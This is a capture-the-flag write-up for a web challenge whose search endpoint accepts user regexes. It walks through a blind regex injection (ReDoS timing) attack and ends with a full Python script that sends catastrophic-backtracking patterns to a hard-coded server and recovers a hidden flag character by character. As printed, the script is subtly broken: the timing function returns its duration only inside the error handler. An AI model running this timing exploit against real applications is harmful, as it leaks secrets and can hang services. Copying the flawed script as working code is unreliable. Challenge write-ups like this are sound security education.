### Challenge Description

Welcome to CTRL+F the website! It's pretty much just GitHub code search.

[Challenge files](./code-db.zip)

### Overview

In this challenge, we were given an application with a git-like search feature which lets us search for files using `keywords` or `regex`. The flag is in a file named `flag.txt` and naturally so, direct access is blocked. The application filters the match results before returning as such:
```js
const results = Object.entries(filesIndex)
    .filter(([fileName, fileData]) => {
        if (language && language !== 'All') {
            return fileData.language === language;
        }
        return true;
    })
    .map(([fileName, fileData]) => {
        console.log(`Processing file: ${fileName}`);
        let content;
        try {
            content = fs.readFileSync(fileData.path, 'utf-8');
        } catch (e) {
            console.error(`Error reading file ${fileData.path}:`, e);
            return null;
        }

        let matchIndices = [];
        if (searchRegex) {
            matchIndices = handleRegexSearch(content, searchRegex);
        } else if (searchTerm) {
            matchIndices = handleNormalSearch(content, searchTerm);
        }

        if (matchIndices.length === 0) return null;

        const preview = generatePreview(content, matchIndices, PREVIEW_LENGTH);
        return preview
            ? {
                    fileName,
                    preview,
                    language: fileData.language,
                    visible: fileData.visible
                }
            : null;
    })
    .filter(result => result !== null && result.visible);

```
The visible property is set to `false` for flag.txt earlier while initialization.

### Solution

The node application uses a unique feature called `worker-threads` that I had never seen before, so I read a bit about it. Turns out it allowed parallelism in Node.js for CPU-intensive tasks. Obviously enough, our first guess was that there would be some `Race Condition` but there wasn't, we just wasted a few hours down that rabbit hole.

The filter code seemed perfectly fine; we couldn't fool the filters. Then continuing with our search, we thought of looking out for some Regex based attacks and stumbled upon something interesting - [ReDos](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS). Turns out we can DoS a server if we feed it a computationally expensive `Evil Regex` 😈. Ah! now the worker threads make sense.
```
The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression (Regex) to enter these extreme situations and then hang for a very long time.
```

So maybe we could make such a regex that detects if certain pattern exists in a string or not and cause a delayed response accordingly, and we could extracted the flag char by char with a time-based attack. Sounds impressive right? But we didn't knew if this was possible, so the search started again.. and we found out this intresting blog post from Portswigger - [Blind regex injection: Theoretical exploit offers new means of forcing web apps to spill secrets](https://portswigger.net/daily-swig/blind-regex-injection-theoretical-exploit-offers-new-way-to-force-web-apps-to-spill-secrets)

It explained how this exploit was possible and even included a link to a proof of concept (PoC). Nice! If you want a more thorough understanding of the exploit, check out this highly recommended [post](https://diary.shift-js.info/blind-regular-expression-injection/).

After gaining a basic understanding of the exploit, we modified it to suit our challenge. Here's the final script we created:


```py
import socket
import requests
import sys
import time
import random
import string
import re

THRESHOLD = 1

def length_in(i, j):
    return ".{" + str(i) + "," + str(j) + "}$"

def nth_char_in(n, S):
    return ".{" + str(n-1) + "}[" + ''.join(list(map(re.escape, S))) + "].*$"

def redos_if(regexp, salt):
    return "^uoftctf(?={})(((.*)*)*)*{}".format(regexp, salt)

def get_request_duration(payload):
    try:
        payload = "/" + payload + "/"
        _start = time.time()
        requests.post("http://34.162.172.123:3000/search", json={"query": payload, "language": "All"})
        _end = time.time()
        duration = _end - _start
    except:
        duration = -1
        exit(1)
        return duration


def prop_holds(prop, salt):
    return get_request_duration(redos_if(prop, salt)) > THRESHOLD

def generate_salt():
    return ''.join([random.choice(string.ascii_letters) for i in range(10)])

if __name__ == '__main__':
    salt = generate_salt()
    while not prop_holds('.*', salt):
        salt = generate_salt()
    print("[+] salt: {}".format(salt))
    lower_bound = 1
    upper_bound = 100
    while lower_bound != upper_bound:
        m = (lower_bound + upper_bound) // 2
        if prop_holds(length_in(lower_bound, m), salt):
            upper_bound = m
        else:
            lower_bound = m + 1
        print("[*] {}, {}".format(lower_bound, upper_bound))
    secret_length = lower_bound   
    print("[+] length: {}".format(secret_length))

    S = string.printable
    secret = ""
    for i in range(0, secret_length):
        lower_bound = 0
        upper_bound = len(S)-1
        while lower_bound != upper_bound:
            m = (lower_bound + upper_bound) // 2
            if prop_holds(nth_char_in(i+1, S[lower_bound:(m+1)]), salt):
                upper_bound = m
            else:
                lower_bound = m + 1
        secret += S[lower_bound]
        print("[*] {}".format(secret))        
    print("[+] secret: {}".format(secret))
```

And surprisingly, it worked! Watching the flag revealed character by character was so exciting—a truly fun challenge!